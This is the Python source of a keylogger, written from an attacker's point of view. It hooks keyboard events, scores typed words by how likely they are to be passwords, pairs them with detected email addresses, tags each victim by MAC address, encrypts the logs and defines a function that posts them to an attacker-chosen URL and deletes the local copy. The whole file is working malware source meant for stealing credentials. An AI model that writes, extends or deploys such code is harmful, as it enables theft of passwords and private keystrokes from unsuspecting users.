import keyboard
import os
import re
from typing import IO
import requests
import uuid
import time
import encryption_decryption


class Word:
    def __init__(self) -> None:
        self.letters = "" # Contains the actual letters of the word
        self.status = False # Status of the word being typed, whether the user has finished typing it out or not
        self.priority = 2 # Priority of the word, check @word_priority_predictor

# Create a filename based off the current timestamp and the infected device's MAC address
# The name is in the format timestamp MAC address
# This allows the attacker to identify each infected and each uploaded file per infected

def generate_file_name()-> str:
    time_stamp = time.strftime('%Y-%m-%d %H.%M.%S', time.localtime())
    return str(time_stamp+" "+str(uuid.getnode()))

# Creates the logged_words_file and returns an IO object for writing to the file
def create_logged_words_file(path:str, file_name:str)->IO:
    file_path = os.path.join(os.path.abspath(path), file_name)
    return open(file_path, "ab")

# Determines the priority of a word bassed off of how likely it is to be a password
def word_priority_predictor(word: Word)->int:
    # Matches any string that is 8 characters or more, as most passwords usually are
    length_regex = re.compile(r'^.{8,}$')
    # Matches any string that includes a mix of uppercase and lowercase letters, numbers, and special characters, which is usually a password requirement
    special_char_regex = re.compile(r'^(?=.*?[A-Z])(?=.*?[a-z])(?=.*?[0-9])(?=.*?[#?!@$%^&*-])\S+$')

    if length_regex.match(word.letters):
        if special_char_regex.match(word.letters) or len(word.letters.split("password:"))>1:
            word.priority = 0
        else:
            word.priority = 1

# Keeps track of the word being typed until enter or space or tab is logged
def read_word_being_typed(event: keyboard.KeyboardEvent, word: Word):
    # If enter, space or tab is logged then return true cause we assume the infected has finished typing the word
    if (event.name == "enter" or event.name == "space" or event.name == "tab"):
        if email_check(word.letters):
            word.letters = f"email:  {word.letters}  password: "
            return

        word_priority_predictor(word)
        if word.priority < 2:
            word.status = True
        else:
            word.letters = ""
    elif event.name == "backspace":
        word.letters = word.letters[:-1] if word.letters else "" # To avoid an IndexError for cases where the string is empty
    else:
        # Update the word string if only one character was entered, to avoid saving keyboard events like ctrl, shift etc
        if len(event.name)==1:
            word.letters+=event.name

# Check whether the typed word is potentially an email
def email_check(word: str):
    email_regex = re.compile('^[\w+\-.]+@[a-z\d\-]+(\.[a-z\d\-]+)*\.[a-z]+$')
    return email_regex.match(word)

# Encrypt the logged word then write it to the logged_words_file
def update_logged_words_file(words: list[Word], public_key: encryption_decryption.rsa.RSAPublicKey, file: IO):
    #Final string containing all the logged words
    final_string = ""
    for word in words:
        final_string+=f"{word.letters} {word.priority}\n"
    # Convert the string into bytes for encryption
    encoded = final_string.encode() 
    encrypted = encryption_decryption.encrypt(encoded, public_key)
    file.write(encrypted)
    print("Logged")

# Upload the file to whatever site the attacker wants then delete it in the infected device
def upload(file_path:str, file_name:str, url:str, token:str)->bool:
    with open(file_path, "rb") as f:
        file = {"file": (file_name, f)}
        response = requests.post(url=url+token, files=file)
    os.unlink(file_path)
    return response.json()["status"]

root_script_path = "./"
public_key_path = root_script_path+"public_key.pem"
logged_files_folder = root_script_path+"/logged_files"
upload_rate = 2 # Rate at which logged words should be uploaded, e.g upload_rate = 2 would mean upload after every two words 

# Script loop
def main():
    if not os.path.exists(logged_files_folder): os.mkdir(logged_files_folder)
    logged_words_file = create_logged_words_file(logged_files_folder, generate_file_name())
    public_key = encryption_decryption.load_public_key(public_key_path)
    words = []
    while True:
        word = Word()
        words.append(word)
        # lambda function in order the pass the word object to read_word_being_typed, kinda hacky
        hooked_function = lambda event: read_word_being_typed(event, word)
        hook = keyboard.on_press(hooked_function)
        while not word.status: pass
        keyboard.unhook(hook)
        if len(words) == upload_rate:
            update_logged_words_file(words, public_key, logged_words_file)
            logged_words_file = create_logged_words_file(logged_files_folder, generate_file_name()) 
            words = []

if __name__ == "__main__":
    main()

